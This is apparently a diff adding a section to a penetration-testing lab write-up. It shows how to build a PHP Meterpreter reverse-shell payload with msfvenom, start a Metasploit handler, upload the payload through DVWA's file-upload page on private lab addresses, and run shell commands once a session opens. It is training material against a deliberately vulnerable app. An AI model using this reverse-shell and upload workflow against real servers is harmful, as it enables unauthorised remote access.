@@ -279,3 +279,59 @@ Where we can add the command in the input box:
 ![php-webshell-input-1](php-webshell-input-1.png)
 ![php-webshell-input-2](php-webshell-input-2.png)
 
+## MSFVenom exploit
+
+```
+msfvenom -p php/meterpreter/reverse_tcp \
+    LHOST=192.168.57.10 \
+    LPORT=4444
+    -f raw > msfvenom-shell.php
+```
+
+![msfvenom-exploit](msfvenom-exploit.png)
+
+```
+msfconsole
+
+# --------------------------------------------
+  msf6 >> use exploit/multi/handler
+  msf6 >> set PAYLOAD php/meterpreter/reverse_tcp
+  msf6 >> set LHOST 192.168.57.10
+  msf6 >> set LPORT 4444
+  msf6 >> set ExitOnSession false
+  msf6 >> show options
+```
+![msfvenom-exploit-msfconsole-show-options](msfvenom-exploit-msfconsole-show-options.png)
+
+```
+  msf6 >> exploit -j -z
+```
+
+Then we go to `192.168.57.30/dvwa/vulnerabilities/upload` and upload what the `msfvenom-shell.php` that we have created before: 
+
+![msfvenom-exploit-upload](msfvenom-exploit-upload.png)
+
+We check the `meterpreter` that is listening:
+
+![msfvenom-exploit-1](msfvenom-exploit-1.png)
+
+once we go to `192.168.57.10:4444``
+
+![msfvenom-exploit-2](msfvenom-exploit-2.png)
+
+```
+sessions -i 
+
+  meterpreter > sysinfo
+  meterpreter > getuid
+
+  shell
+    whoami
+    pwd
+    ls -al
+```
+
+![msfvenom-exploit-meterpreter](msfvenom-exploit-meterpreter.png)
+
+Thanks to the output from `ls -al`we know that we are in `DVWA`, because we can find what we saw already in the excercise of uploading the `php`script that we wrote. 
+
